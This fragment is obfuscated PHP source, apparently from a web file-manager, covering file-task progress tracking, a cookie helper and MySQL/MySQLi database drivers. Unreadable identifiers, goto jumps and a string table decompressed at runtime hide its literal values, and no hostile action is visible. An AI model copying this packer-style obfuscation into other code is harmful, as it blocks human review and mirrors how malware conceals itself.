(!$ı–ÉÇµÜ[$÷‘•¼çÉ[1154]] || !$ı–ÉÇµÜ[$÷‘•¼çÉ[848]]) { if ($ı–ÉÇµÜ[$÷‘•¼çÉ[1905]] != $÷‘•¼çÉ[391]) { return; } } if ($ı–ÉÇµÜ[$÷‘•¼çÉ[1905]] == $÷‘•¼çÉ[1293]) { $€Ì­Å–Ş = 0; if ($ı–ÉÇµÜ[$÷‘•¼çÉ[1839]]) { $€Ì­Å–Ş = $ı–ÉÇµÜ[$÷‘•¼çÉ[1840]] / $ı–ÉÇµÜ[$÷‘•¼çÉ[1839]]; } $ı–ÉÇµÜ[$÷‘•¼çÉ[1787]] = $€Ì­Å–Ş * 0.3; } else { if ($ı–ÉÇµÜ[$÷‘•¼çÉ[1905]] == $÷‘•¼çÉ[391]) { $€Ì­Å–Ş = $ı–ÉÇµÜ[$÷‘•¼çÉ[1786]] / $ı–ÉÇµÜ[$÷‘•¼çÉ[1154]]; $ı–ÉÇµÜ[$÷‘•¼çÉ[1787]] = 0.3 + $€Ì­Å–Ş * 0.4; } else { if ($ı–ÉÇµÜ[$÷‘•¼çÉ[1905]] == $÷‘•¼çÉ[110]) { $™§èâøã = 0; if ($ı–ÉÇµÜ[$÷‘•¼çÉ[1841]] == $÷‘•¼çÉ[110]) { $™§èâøã = $ı–ÉÇµÜ[$÷‘•¼çÉ[1840]]; } $€Ì­Å–Ş = ($ı–ÉÇµÜ[$÷‘•¼çÉ[1844]] + $™§èâøã) / $ı–ÉÇµÜ[$÷‘•¼çÉ[848]]; $ı–ÉÇµÜ[$÷‘•¼çÉ[1787]] = 0.3 + 0.4 + $€Ì­Å–Ş * 0.3; } } } if ($ı–ÉÇµÜ[$÷‘•¼çÉ[1787]] > 0) { $‚êåÆìÌ = timeFloat() - $ı–ÉÇµÜ[$÷‘•¼çÉ[1789]] - $ı–ÉÇµÜ[$÷‘•¼çÉ[1792]]; $ı–ÉÇµÜ[$÷‘•¼çÉ[1793]] = $‚êåÆìÌ * (1 - $ı–ÉÇµÜ[$÷‘•¼çÉ[1787]]) / $ı–ÉÇµÜ[$÷‘•¼çÉ[1787]]; } } public function addFile($Œó£öİ§) { $ªÏäğı =& $_SERVER[ˆö¿ÚÌ¼]; $®²íòÑ =& $this->task; $„¿ğ¾øü = IO::info($Œó£öİ§); $®²íòÑ[$ªÏäğı[1837]] = $„¿ğ¾øü[$ªÏäğı[32]]; $®²íòÑ[$ªÏäğı[1839]] = $„¿ğ¾øü[$ªÏäğı[79]]; $®²íòÑ[$ªÏäğı[1840]] = 0; $®²íòÑ[$ªÏäğı[1156]] = $ªÏäğı[1860]; $®²íòÑ[$ªÏäğı[1841]] = $ªÏäğı[1293]; $®²íòÑ[$ªÏäğı[848]] = $„¿ğ¾øü[$ªÏäğı[79]]; $®²íòÑ[$ªÏäğı[1154]] = 1; $È¾“ğŠ› = 0; $®²íòÑ[$ªÏäğı[1848]] = array($ªÏäğı[1849] => $È¾“ğŠ› + 1, $ªÏäğı[506] => $„¿ğ¾øü[$ªÏäğı[32]], $ªÏäğı[87] => $„¿ğ¾øü[$ªÏäğı[87]], $ªÏäğı[596] => $„¿ğ¾øü[$ªÏäğı[596]] ? $„¿ğ¾øü[$ªÏäğı[596]] : $„¿ğ¾øü[$ªÏäğı[87]]); $this->update(); } public function zipEvent($·õå¢Ç©, $âèÎ²°ó, $Æ¡ò¿’§, $ÊÕ¦ä¹¸) { $Ìô¸„ =& $_SERVER[ˆö¿ÚÌ¼]; $Ü®Èıõ =& $this->task; $Ü®Èıõ[$Ìô¸„[1837]] = get_path_this($âèÎ²°ó); $Ü®Èıõ[$Ìô¸„[1839]] = $ÊÕ¦ä¹¸; $Ü®Èıõ[$Ìô¸„[1840]] = $Æ¡ò¿’§; $Ü®Èıõ[$Ìô¸„[1156]] = $·õå¢Ç© == $Ìô¸„[1907] ? $Ìô¸„[1908] : $Ìô¸„[1909]; $Ü®Èıõ[$Ìô¸„[1841]] = $Ìô¸„[12]; $Ü®Èıõ[$Ìô¸„[848]] = $ÊÕ¦ä¹¸; $Ü®Èıõ[$Ìô¸„[1905]] = $Ìô¸„[391]; $this->update(); } public function unzipAfter($œßüˆúÚ) { $‰ñŸÅƒö =& $_SERVER[ˆö¿ÚÌ¼]; $õ“Å•„Ï =& $this->task; $õ“Å•„Ï[$‰ñŸÅƒö[1905]] = $‰ñŸÅƒö[110]; $à²Ï¡¶û = IO::infoWithChildren($œßüˆúÚ); $„úÇ¤õ = 0; $õ“Å•„Ï[$‰ñŸÅƒö[1848]] = array($‰ñŸÅƒö[1849] => $„úÇ¤õ + 1, $‰ñŸÅƒö[506] => $à²Ï¡¶û[$‰ñŸÅƒö[32]], $‰ñŸÅƒö[87] => $à²Ï¡¶û[$‰ñŸÅƒö[87]], $‰ñŸÅƒö[596] => $à²Ï¡¶û[$‰ñŸÅƒö[596]] ? $à²Ï¡¶û[$‰ñŸÅƒö[596]] : $à²Ï¡¶û[$‰ñŸÅƒö[87]]); if ($à²Ï¡¶û[$‰ñŸÅƒö[33]] == $‰ñŸÅƒö[233]) { $õ“Å•„Ï[$‰ñŸÅƒö[1154]] = 1; } else { $õ“Å•„Ï[$‰ñŸÅƒö[1154]] = $à²Ï¡¶û[$‰ñŸÅƒö[82]][$‰ñŸÅƒö[80]]; } $õ“Å•„Ï[$‰ñŸÅƒö[1156]] = $‰ñŸÅƒö[12]; $õ“Å•„Ï[$‰ñŸÅƒö[1841]] = 0; $õ“Å•„Ï[$‰ñŸÅƒö[1786]] = 0; $õ“Å•„Ï[$‰ñŸÅƒö[1839]] = 0; $õ“Å•„Ï[$‰ñŸÅƒö[1840]] = 0; $õ“Å•„Ï[$‰ñŸÅƒö[1837]] = $‰ñŸÅƒö[12]; $õ“Å•„Ï[$‰ñŸÅƒö[1844]] = 0; $õ“Å•„Ï[$‰ñŸÅƒö[848]] = $à²Ï¡¶û[$‰ñŸÅƒö[79]]; $this->update(); self::log($‰ñŸÅƒö[1910] . json_encode(array($õ“Å•„Ï, $à²Ï¡¶û))); } public function nameParse($ù‡¯Ş‡) { $ñÈÚÏÆ =& $_SERVER[ˆö¿ÚÌ¼]; $ò¼ÔÑÃù =& $this->task; if ($ò¼ÔÑÃù[$ñÈÚÏÆ[1905]] == $ñÈÚÏÆ[1293]) { $ò¼ÔÑÃù[$ñÈÚÏÆ[1905]] = $ñÈÚÏÆ[391]; $ò¼ÔÑÃù[$ñÈÚÏÆ[1844]] = 0; $ò¼ÔÑÃù[$ñÈÚÏÆ[848]] = 0; } $†¨µŠª¬ = get_path_this($ù‡¯Ş‡); if (strstr($†¨µŠª¬, $ñÈÚÏÆ[10])) { $ò¼ÔÑÃù[$ñÈÚÏÆ[1786]] += 1; $ò¼ÔÑÃù[$ñÈÚÏÆ[1154]] += 1; } $ò¼ÔÑÃù[$ñÈÚÏÆ[1837]] = $ù‡¯Ş‡; $this->update(); } } goto e×ÊÚ¸¸¦ß; eğ˜øªºá: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($»¤¸ä = '', $«”ıàµ = 0) { if (is_string($»¤¸ä) && $»¤¸ä != $_SERVER[ˆö¿ÚÌ¼][12]) { $this->prefix = $»¤¸ä; } if (is_numeric($«”ıàµ) && $«”ıàµ > 0) { $this->expire = $«”ıàµ; } } public static function getInstance() { static $óâÕ¢ƒ; if ($óâÕ¢ƒ === null) { $óâÕ¢ƒ = new self(); } return $óâÕ¢ƒ; } private static $cookieDisable = false; public static function disable($‚¬Éß°í) { self::$cookieDisable = $‚¬Éß°í; } private static $sameCookieSet = array(); public static function set($°–Ğ”¬è, $••¨»œÙ, $¿êÈè—ø = 0, $½ù×Å = false, $ä€×·ÀÎ = false) { $¦¤ÖòÁñ =& $_SERVER[ˆö¿ÚÌ¼]; if (self::$cookieDisable) { return; } if (!$¿êÈè—ø) { $¿êÈè—ø = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$°–Ğ”¬è]) && self::$sameCookieSet[$°–Ğ”¬è] == $••¨»œÙ . $¿êÈè—ø) { return; } self::$sameCookieSet[$°–Ğ”¬è] = $••¨»œÙ . $¿êÈè—ø; if (!$ä€×·ÀÎ) { $ä€×·ÀÎ = str_replace(HOST, $¦¤ÖòÁñ[12], APP_HOST); $ä€×·ÀÎ = _get($GLOBALS, $¦¤ÖòÁñ[974], $ä€×·ÀÎ); } $Àç’¸Ã = $¦¤ÖòÁñ[12]; setcookie($°–Ğ”¬è, $••¨»œÙ, time() + $¿êÈè—ø, $¦¤ÖòÁñ[8] . trim($ä€×·ÀÎ, $¦¤ÖòÁñ[8]) . $Àç’¸Ã, !1, !1, $½ù×Å); } public static function setSafe($÷‡×í—¿, $ë»ª‚•º, $û†ó¸·õ = 0) { self::set($÷‡×í—¿, $ë»ª‚•º, $û†ó¸·õ, !0); } public static function get($ÈØ÷ÓŒ) { static $Í±û¸â¾ = false; if (!$Í±û¸â¾) { self::initHeaderCookie(); $Í±û¸â¾ = !0; } return isset($_COOKIE[$ÈØ÷ÓŒ]) ? $_COOKIE[$ÈØ÷ÓŒ] : !1; } private static function initHeaderCookie() { $Ğâş¨¹š =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($_SERVER[$Ğâş¨¹š[975]]) || !$_SERVER[$Ğâş¨¹š[975]]) { return; } $€•ãë‚‹ = explode($Ğâş¨¹š[74], $_SERVER[$Ğâş¨¹š[975]]); foreach ($€•ãë‚‹ as $“¹Œ¿„™) { $“¹Œ¿„™ = explode($Ğâş¨¹š[518], $“¹Œ¿„™); if (count($“¹Œ¿„™) != 2 || !isset($“¹Œ¿„™[1])) { continue; } $_COOKIE[trim($“¹Œ¿„™[0])] = trim($“¹Œ¿„™[1]); } } public static function remove($ÒÄ­ïıŞ, $úîµ¹› = false) { unset($_COOKIE[$ÒÄ­ïıŞ]); self::set($ÒÄ­ïıŞ, $_SERVER[ˆö¿ÚÌ¼][12], 1, $úîµ¹›); } } class DbMysql extends Db { public function __construct($‹Ú‚ë™º = '') { $Åè³ÓÍÆ =& $_SERVER[ˆö¿ÚÌ¼]; if (!extension_loaded($Åè³ÓÍÆ[893])) { think_exception(think_lang($Åè³ÓÍÆ[14]) . $Åè³ÓÍÆ[976]); } if (!empty($‹Ú‚ë™º)) { $this->config = $‹Ú‚ë™º; if (empty($this->config[$Åè³ÓÍÆ[17]])) { $this->config[$Åè³ÓÍÆ[17]] = $Åè³ÓÍÆ[12]; } } } public function connect($å´½º£Û = '', $›ıù±¯ƒ = 0, $ã¶Ô“·ı = false) { $ÑÙ€“Ú¡ =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($this->linkID[$›ıù±¯ƒ])) { if (empty($å´½º£Û)) { $å´½º£Û = $this->config; } $µçÖ–âá = $å´½º£Û[$ÑÙ€“Ú¡[977]] . ($å´½º£Û[$ÑÙ€“Ú¡[978]] ? "\x3a{$å´½º£Û[$ÑÙ€“Ú¡[978]]}" : $ÑÙ€“Ú¡[12]); $¡À´Í = !empty($å´½º£Û[$ÑÙ€“Ú¡[17]][$ÑÙ€“Ú¡[18]]) ? $å´½º£Û[$ÑÙ€“Ú¡[17]][$ÑÙ€“Ú¡[18]] : $this->pconnect; if ($¡À´Í) { $this->linkID[$›ıù±¯ƒ] = mysql_pconnect($µçÖ–âá, $å´½º£Û[$ÑÙ€“Ú¡[979]], $å´½º£Û[$ÑÙ€“Ú¡[980]], 131072); } else { $this->linkID[$›ıù±¯ƒ] = mysql_connect($µçÖ–âá, $å´½º£Û[$ÑÙ€“Ú¡[979]], $å´½º£Û[$ÑÙ€“Ú¡[980]], !0, 131072); } if (!$this->linkID[$›ıù±¯ƒ] || !empty($å´½º£Û[$ÑÙ€“Ú¡[21]]) && !mysql_select_db($å´½º£Û[$ÑÙ€“Ú¡[21]], $this->linkID[$›ıù±¯ƒ])) { think_exception(mysql_error()); } $ÍÁö®š˜ = mysql_get_server_info($this->linkID[$›ıù±¯ƒ]); mysql_query($ÑÙ€“Ú¡[981] . think_config($ÑÙ€“Ú¡[982]) . $ÑÙ€“Ú¡[58], $this->linkID[$›ıù±¯ƒ]); if ($ÍÁö®š˜ > $ÑÙ€“Ú¡[983]) { mysql_query($ÑÙ€“Ú¡[984], $this->linkID[$›ıù±¯ƒ]); } $this->connected = !0; if (1 != think_config($ÑÙ€“Ú¡[22])) { unset($this->config); } } return $this->linkID[$›ıù±¯ƒ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($§šÃÔ) { $¹±­û¯í =& $_SERVER[ˆö¿ÚÌ¼]; if (0 === stripos($§šÃÔ, $¹±­û¯í[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $§šÃÔ; if ($this->queryID) { $this->free(); } think_action_status($¹±­û¯í[23], 1); think_status($¹±­û¯í[24]); $this->queryID = mysql_query($§šÃÔ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($•Ëƒ) { $’„Õ·Û½ =& $_SERVER[ˆö¿ÚÌ¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $•Ëƒ; if ($this->queryID) { $this->free(); } think_action_status($’„Õ·Û½[25], 1); think_status($’„Õ·Û½[24]); $¸²¬Ö¯— = mysql_query($•Ëƒ, $this->_linkID); $this->debug(); if (!1 === $¸²¬Ö¯—) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ˆö¿ÚÌ¼][985], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ïÊÎ“»µ = mysql_query($_SERVER[ˆö¿ÚÌ¼][986], $this->_linkID); $this->transTimes = 0; if (!$ïÊÎ“»µ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ş“¢œ = mysql_query($_SERVER[ˆö¿ÚÌ¼][987], $this->_linkID); $this->transTimes = 0; if (!$ş“¢œ) { $this->error(); return !1; } } return !0; } private function getAll() { $ü¿—‰§µ = array(); if ($this->numRows > 0) { while ($ıªş­¼’ = mysql_fetch_assoc($this->queryID)) { $ü¿—‰§µ[] = $ıªş­¼’; } mysql_data_seek($this->queryID, 0); } return $ü¿—‰§µ; } public function getFields($ïä±Ó¾¸) { $…ãŒÛ¿ó =& $_SERVER[ˆö¿ÚÌ¼]; $‚Œõàú€ = $this->query($…ãŒÛ¿ó[988] . $this->parseKey($ïä±Ó¾¸)); $¨æ–”Á‡ = array(); if ($‚Œõàú€) { foreach ($‚Œõàú€ as $®Ö¤Ÿ·Á => $üÕƒ–ê) { $¨æ–”Á‡[$üÕƒ–ê[$…ãŒÛ¿ó[31]]] = array($…ãŒÛ¿ó[32] => $üÕƒ–ê[$…ãŒÛ¿ó[31]], $…ãŒÛ¿ó[33] => $üÕƒ–ê[$…ãŒÛ¿ó[34]], $…ãŒÛ¿ó[35] => (bool) (strtoupper($üÕƒ–ê[$…ãŒÛ¿ó[36]]) === $…ãŒÛ¿ó[989]), $…ãŒÛ¿ó[37] => $üÕƒ–ê[$…ãŒÛ¿ó[38]], $…ãŒÛ¿ó[39] => strtolower($üÕƒ–ê[$…ãŒÛ¿ó[40]]) == $…ãŒÛ¿ó[41], $…ãŒÛ¿ó[42] => strtolower($üÕƒ–ê[$…ãŒÛ¿ó[43]]) == $…ãŒÛ¿ó[44]); } } return $¨æ–”Á‡; } public function getTables($“¿÷ñ® = '') { $É¦ÎîæÊ =& $_SERVER[ˆö¿ÚÌ¼]; if (!empty($“¿÷ñ®)) { $²˜«¶í• = $É¦ÎîæÊ[990] . $“¿÷ñ® . $É¦ÎîæÊ[991]; } else { $²˜«¶í• = $É¦ÎîæÊ[992]; } $ÉÈ¾³™… = $this->query($²˜«¶í•); $”âùÁÄ¡ = array(); foreach ($ÉÈ¾³™… as $ä‘®¢–» => $²êıöß¢) { $”âùÁÄ¡[$ä‘®¢–»] = current($²êıöß¢); } return $”âùÁÄ¡; } public function replace($šÓµ¼¤, $öêÜ—êÊ = array()) { $õ‹Æîó =& $_SERVER[ˆö¿ÚÌ¼]; foreach ($šÓµ¼¤ as $îïµßÏã => $Ä¯”ú†©) { $‰ŞÈšúË = $this->parseValue($Ä¯”ú†©); if (is_scalar($‰ŞÈšúË)) { $‰Øó”‰Š[] = $‰ŞÈšúË; $Ú¸³³Ç[] = $this->parseKey($îïµßÏã); } } $‘÷³÷Ö = $õ‹Æîó[993] . $this->parseTable($öêÜ—êÊ[$õ‹Æîó[359]]) . $õ‹Æîó[994] . implode($õ‹Æîó[50], $Ú¸³³Ç) . $õ‹Æîó[995] . implode($õ‹Æîó[50], $‰Øó”‰Š) . $õ‹Æîó[996]; return $this->execute($‘÷³÷Ö); } public function insertAll($¶ÛµÆ¹ê, $ÁëœÇÖ = array(), $ÚØÔëù´ = false) { $ïğòûıú =& $_SERVER[ˆö¿ÚÌ¼]; if (!is_array($¶ÛµÆ¹ê[0])) { return !1; } $¸Œì‹÷à = array_keys($¶ÛµÆ¹ê[0]); $ª÷¨šíó = array(); foreach ($¶ÛµÆ¹ê as $ÈŸ«ºüœ) { $íœ¹²› = array(); foreach ($ÈŸ«ºüœ as $‰…Œ–ÈÒ => $øïÁÊà¸) { $øïÁÊà¸ = $this->parseValue($øïÁÊà¸); if (is_scalar($øïÁÊà¸)) { $íœ¹²›[] = $øïÁÊà¸; } } $ª÷¨šíó[] = $ïğòûıú[340] . implode($ïğòûıú[50], $íœ¹²›) . $ïğòûıú[996]; } array_walk($¸Œì‹÷à, array($this, $ïğòûıú[997])); $ÀÃı€¬ª = ($ÚØÔëù´ ? $ïğòûıú[998] : $ïğòûıú[999]) . $ïğòûıú[1000] . $this->parseTable($ÁëœÇÖ[$ïğòûıú[359]]) . $ïğòûıú[994] . implode($ïğòûıú[50], $¸Œì‹÷à) . $ïğòûıú[1001] . implode($ïğòûıú[50], $ª÷¨šíó); return $this->execute($ÀÃı€¬ª); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÎõÁóıÆ =& $_SERVER[ˆö¿ÚÌ¼]; $this->error = mysql_errno() . $ÎõÁóıÆ[4] . mysql_error($this->_linkID); if ($ÎõÁóıÆ[12] != $this->queryStr) { $this->error .= LNG($ÎõÁóıÆ[48]) . $this->queryStr; } think_trace($this->error, $ÎõÁóıÆ[12], $ÎõÁóıÆ[49]); return $this->error; } public function escapeString($øĞï¤œÉ) { if ($this->_linkID) { return mysql_real_escape_string($øĞï¤œÉ, $this->_linkID); } else { return mysql_escape_string($øĞï¤œÉ); } } public function parseKey(&$ƒÃñû…ò, $×ÑØÉ”¥ = true) { $¶·ƒ´•å =& $_SERVER[ˆö¿ÚÌ¼]; if ($×ÑØÉ”¥) { $ƒÃñû…ò = $this->parseKeyCheck($ƒÃñû…ò); } if ($ƒÃñû…ò != $¶·ƒ´•å[223] && !preg_match($¶·ƒ´•å[1002], $ƒÃñû…ò)) { $ƒÃñû…ò = $¶·ƒ´•å[464] . trim($ƒÃñû…ò, $¶·ƒ´•å[464]) . $¶·ƒ´•å[464]; } return $ƒÃñû…ò; } } class DbMysqli extends Db { public function __construct($Íûë¨à‡ = '') { $³ë‡Á·‡ =& $_SERVER[ˆö¿ÚÌ¼]; if (!extension_loaded($³ë‡Á·‡[1003])) { think_exception(think_lang($³ë‡Á·‡[14]) . $³ë‡Á·‡[1004]); } if (!empty($Íûë¨à‡)) { $this->config = $Íûë¨à‡; if (empty($this->config[$³ë‡Á·‡[17]])) { $this->config[$³ë‡Á·‡[17]] = $³ë‡Á·‡[12]; } } } public function connect($¹Ê‹º = '', $Íºêà– = 0) { $»ú¡±ß” =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($this->linkID[$Íºêà–])) { if (empty($¹Ê‹º)) { $¹Ê‹º = $this->config; } $this->linkID[$Íºêà–] = new mysqli($¹Ê‹º[$»ú¡±ß”[977]], $¹Ê‹º[$»ú¡±ß”[979]], $¹Ê‹º[$»ú¡±ß”[980]], $¹Ê‹º[$»ú¡±ß”[21]], $¹Ê‹º[$»ú¡±ß”[978]] ? intval($¹Ê‹º[$»ú¡±ß”[978]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $«Ù¹Ï¾ô = $this->linkID[$Íºêà–]->server_version; $this->linkID[$Íºêà–]->query($»ú¡±ß”[981] . think_config($»ú¡±ß”[982]) . $»ú¡±ß”[58]); if ($«Ù¹Ï¾ô > $»ú¡±ß”[983]) { $this->linkID[$Íºêà–]->query($»ú¡±ß”[984]); } $this->connected = !0; if (1 != think_config($»ú¡±ß”[22])) { unset($this->config); } } return $this->linkID[$Íºêà–]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ îÌàšÔ) { $½Øô½ıá =& $_SERVER[ˆö¿ÚÌ¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ îÌàšÔ; if ($this->queryID) { $this->free(); } think_action_status($½Øô½ıá[23], 1); think_status($½Øô½ıá[24]); $this->queryID = $this->_linkID->query($ îÌàšÔ); if ($this->_linkID->more_results()) { while (($ª¡ŠÛ† = $this->_linkID->next_result()) != NULL) { $ª¡ŠÛ†->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ù‘¨Ï) { $—³›Ñ§ª =& $_SERVER[ˆö¿ÚÌ¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ù‘¨Ï; if ($this->queryID) { $this->free(); } think_action_status($—³›Ñ§ª[25], 1); think_status($—³›Ñ§ª[24]); $ƒÙ’÷ Ç = $this->_linkID->query($ù‘¨Ï); $this->debug(); if (!1 === $ƒÙ’÷ Ç) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $æ•ˆŞ¤¦ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$æ•ˆŞ¤¦) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ßõá×ı™ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ßõá×ı™) { $this->error(); return !1; } } return !0; } private function getAll() { $‘ŠîÜ¼Ñ = array(); if ($this->numRows > 0) { for ($‚ŸëÄÁ = 0; $‚ŸëÄÁ < $this->numRows; $‚ŸëÄÁ++) { $‘ŠîÜ¼Ñ[$‚ŸëÄÁ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $‘ŠîÜ¼Ñ; } public function getFields($É”·—“¿) { $Ö­òÙ¬Ò =& $_SERVER[ˆö¿ÚÌ¼]; $®éòå = $this->query($Ö­òÙ¬Ò[988] . $this->parseKey($É”·—“¿)); $ïËÏ²Ì“ = array(); if ($®éòå) { foreach ($®éòå as $œ®É»‚ => $ì‰ëÙ±Ù) { $ïËÏ²Ì“[$ì‰ëÙ±Ù[$Ö­òÙ¬Ò[31]]] = array($Ö­òÙ¬Ò[32] => $ì‰ëÙ±Ù[$Ö­òÙ¬Ò[31]], $Ö­òÙ¬Ò[33] => $ì‰ëÙ±Ù[$Ö­òÙ¬Ò[34]], $Ö­òÙ¬Ò[35] => (bool) ($ì‰ëÙ±Ù[$Ö­òÙ¬Ò[36]] === $Ö­òÙ¬Ò[12]), $Ö­òÙ¬Ò[37] => $ì‰ëÙ±Ù[$Ö­òÙ¬Ò[38]], $Ö­òÙ¬Ò[39] => strtolower($ì‰ëÙ±Ù[$Ö­òÙ¬Ò[40]]) == $Ö­òÙ¬Ò[41], $Ö­òÙ¬Ò[42] => strtolower($ì‰ëÙ±Ù[$Ö­òÙ¬Ò[43]]) == $Ö­òÙ¬Ò[44]); } } return $ïËÏ²Ì“; } public function getTables($Á¸‹‡Ñğ = '') { $ÛÆÒ–ø‘ =& $_SERVER[ˆö¿ÚÌ¼]; $ıÊ§™š = !empty($Á¸‹‡Ñğ) ? $ÛÆÒ–ø‘[990] . $Á¸‹‡Ñğ . $ÛÆÒ–ø‘[991] : $ÛÆÒ–ø‘[992]; $±¢ëÊ÷ = $this->query($ıÊ§™š); $ôñü‹çˆ = array(); if ($±¢ëÊ÷) { foreach ($±¢ëÊ÷ as $Œô«„û => $«›¤Êøõ) { $ôñü‹çˆ[$Œô«„û] = current($«›¤Êøõ); } } return $ôñü‹çˆ; } public function replace($ºÑÄÍ, $É¢ çšª = array()) { $îï§Òıê =& $_SERVER[ˆö¿ÚÌ¼]; foreach ($ºÑÄÍ as $„´Û­Í => $›î¬ˆ„¯) { $Í—–ÃÆÂ = $this->parseValue($›î¬ˆ„¯); if (is_scalar($Í—–ÃÆÂ)) { $Èè¥Ú¾ä[] = $Í—–ÃÆÂ; $³«„üí‡[] = $this->parseKey($„´Û­Í); } } $êõ×€áß = $îï§Òıê[993] . $this->parseTable($É¢ çšª[$îï§Òıê[359]]) . $îï§Òıê[994] . implode($îï§Òıê[50], $³«„üí‡) . $îï§Òıê[995] . implode($îï§Òıê[50], $Èè¥Ú¾ä) . $îï§Òıê[996]; return $this->execute($êõ×€áß); } public function insertAll($ÉÊºøîÉ, $ÆŞâìš‘ = array(), $ÜÓÇËÑ = false) { $Àî¿‘íš =& $_SERVER[ˆö¿ÚÌ¼]; if (!is_array($ÉÊºøîÉ[0])) { return !1; } $áÛş”º = array_keys($ÉÊºøîÉ[0]); $ÏÙ«©¢° = array(); foreach ($ÉÊºøîÉ as $¼×¹¸ñ³) { $÷ªéœ = array(); foreach ($¼×¹¸ñ³ as $ëŞü›— => $ĞºüÒ) { $ĞºüÒ = $this->parseValue($ĞºüÒ); if (is_scalar($ĞºüÒ)) { $÷ªéœ[] = $ĞºüÒ; } } $ÏÙ«©¢°[] = $Àî¿‘íš[340] . implode($Àî¿‘íš[50], $÷ªéœ) . $Àî¿‘íš[996]; } array_walk($áÛş”º, array($this, $Àî¿‘íš[997])); $Ş²øßÁ¬ = $ÜÓÇËÑ ? $Àî¿‘íš[998] : $Àî¿‘íš[999]; $Âş¡ÚêŠ = $Ş²øßÁ¬ . $Àî¿‘íš[1000] . $this->parseTable($ÆŞâìš‘[$Àî¿‘íš[359]]) . $Àî¿‘íš[994] . implode($Àî¿‘íš[50], $áÛş”º) . $Àî¿‘íš[1001] . implode($Àî¿‘íš[50], $ÏÙ«©¢°); return $this->execute($Âş¡ÚêŠ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $œŒ¤ÒÜš =& $_SERVER[ˆö¿ÚÌ¼]; $this->error = $this->_linkID->errno . $œŒ¤ÒÜš[4] . $this->_linkID->error; if ($œŒ¤ÒÜš[12] != $this->queryStr) { $this->error .= LNG($œŒ¤ÒÜš[48]) . $this->queryStr; } think_trace($this->error, $œŒ¤ÒÜš[12], $œŒ¤ÒÜš[49]); return $this->error; } public function escapeString($ıËˆÍå) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ıËˆÍå); } else { return addslashes($ıËˆÍå); } } public function parseKey(&$”…ìÑÍ, $œ•–İ«Ú = true) { $‚ïÂÛ§š =& $_SERVER[ˆö¿ÚÌ¼]; if ($œ•–İ«Ú) { $”…ìÑÍ = $this->parseKeyCheck($”…ìÑÍ); } if ($”…ìÑÍ != $‚ïÂÛ§š[223] && !preg_match($‚ïÂÛ§š[1002], $”…ìÑÍ)) { $”…ìÑÍ = $‚ïÂÛ§š[464] . trim($”…ìÑÍ, $‚ïÂÛ§š[464]) . $‚ïÂÛ§š[464]; } return $”…ìÑÍ; } } goto a‘»É™™³; D¤›Çí˜‹Ë: $wmdgqzsiak = $_SERVER[ˆö¿ÚÌ¼][696]; if (strlen($wmdgqzsiak) < $_SERVER[ˆö¿ÚÌ¼][697]) { return; } $_SERVER[›üôÆØÜ] = explode($_SERVER[ˆö¿ÚÌ¼][698], gzinflate(substr($_SERVER[ˆö¿ÚÌ¼][699], 10, -8))); goto fÙ…êÎ©³Á; fß„“˜ŸïÉ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ø’Ôì¨°) { $Ñø¥á•« =& $_SERVER[ˆö¿ÚÌ¼]; $®®Ä˜àŞ = KodIO::fileTypeList(); $ÍûªÙ¦÷ = $®®Ä˜àŞ[$ø’Ôì¨°]; if (!$ÍûªÙ¦÷) { return array(); } $ÊáÈ¾¸õ = $ÍûªÙ¦÷[$Ñø¥á•«[169]]; $ŸäºÉ¸œ = $Ñø¥á•«[7]; if (!$ÍûªÙ¦÷[$Ñø¥á•«[169]]) { $éÚóŞ£ = array_to_keyvalue($®®Ä˜àŞ, $Ñø¥á•«[12], $Ñø¥á•«[169]); $ÊáÈ¾¸õ = implode($Ñø¥á•«[50], $éÚóŞ£); $ŸäºÉ¸œ = $Ñø¥á•«[2253]; } $Ó°½ıÑÖ = explode($Ñø¥á•«[50], trim($ÊáÈ¾¸õ, $Ñø¥á•«[50])); return array($ŸäºÉ¸œ, $Ó°½ıÑÖ); } public function listPathType($Ò¦¼ëŸó) { $ªÒİÍ¨Ç =& $_SERVER[ˆö¿ÚÌ¼]; $š€ë˜·¦ = $this->fileTypeWhere($Ò¦¼ëŸó); if (!$š€ë˜·¦) { return array(); } $ ¡÷ Àû = USER_ID; $•ß’ÉÄì = 